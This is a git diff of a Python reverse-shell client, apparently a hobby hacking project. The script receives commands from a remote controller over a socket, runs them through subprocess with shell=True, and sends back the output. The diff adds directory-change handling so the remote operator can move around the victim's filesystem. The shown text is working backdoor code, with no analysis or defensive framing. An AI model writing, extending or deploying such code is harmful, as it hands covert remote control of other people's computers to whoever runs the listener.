@@ -1,10 +1,11 @@
 #/usr/bin/python
 # Written By: Sahar Hathiramani
-# Date: 01/22/2021
+# Date: 01/21/2021 - 1/23/2021
 
 import socket
 import subprocess 
 import json
+import os
 
 def reliable_send(data):
     jsonData = json.dumps(data.decode())
@@ -24,6 +25,11 @@ def shell():
         command = reliable_recv()
         if command == 'exit':
             break
+        elif command[:2] == "cd" and len(command) > 1:
+            try:
+                os.chdir(command[3:])
+            except:
+                continue
         else:
             proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = proc.stdout.read() + proc.stderr.read()
